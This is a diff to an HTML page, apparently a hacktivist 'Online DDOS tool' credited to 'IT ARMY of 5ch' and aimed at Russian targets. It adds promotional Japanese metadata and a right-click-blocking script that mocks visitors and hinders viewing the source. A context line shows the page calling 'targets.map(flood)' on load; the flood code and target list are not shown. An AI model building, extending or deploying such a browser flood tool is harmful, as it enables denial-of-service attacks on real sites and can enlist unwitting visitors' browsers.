@@ -2,7 +2,20 @@
 <html lang="ja">
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <title>Online DDOS tool - Russian warship, go fuck yourself</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="format-detection" content="telephone=no">
+        <title>Online DDOS tool - タシロシア砲</title>
+        <meta name="keywords" content="たしろしあ,タシロシア,タシロシア砲,田代砲,ロシア,ウクライナ,script,Fuck">
+        <meta name="description" content="Fuck the war! 戦争はクソです。ロシアに戦争をやめさせるにとっておきなのでぜひ。">
+        <meta name="author" content="IT ARMY of 5ch">
+        
+        <meta property="og:title" content="Online DDOS tool - タシロシア砲">
+        <meta property="og:description" content="Fuck the war! 戦争はクソです。ロシアに戦争をやめさせるにとっておきなのでぜひ。">
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://it-army-japan-5ch.github.io/tashirosia.html">
+        
+        <meta name="twitter:site" content="https://it-army-japan-5ch.github.io/tashirosia.html">
     </head>
     <body>
         <h1>UPDATED NEW LINKS - DDOS Script - Fuck the war!</h1>
@@ -210,6 +223,39 @@
         
         // Start
         targets.map(flood)
+        
+        //--------------------------------------------------------------------------
+        
+        //Disable right mouse click Script
+        
+        var message = "右クリックは禁止でちゅよ m9(^Д^)ﾌﾟｷﾞｬｰ";
+        
+        ///////////////////////////////////
+        function clickIE4(){
+            if (event.button == 2){
+                alert(message);
+                return false;
+            }
+        }
+
+        function clickNS4(e){
+            if (document.layers||document.getElementById&&!document.all){
+                if (e.which==2||e.which==3){
+                    alert(message);
+                    return false;
+                }
+            }
+        }
+
+        if (document.layers){
+            document.captureEvents(Event.MOUSEDOWN);
+            document.onmousedown=clickNS4;
+        }
+        else if (document.all&&!document.getElementById){
+            document.onmousedown=clickIE4;
+        }
+
+        document.oncontextmenu=new Function("alert(message);return false")
         </script>
     </body>
 </html>
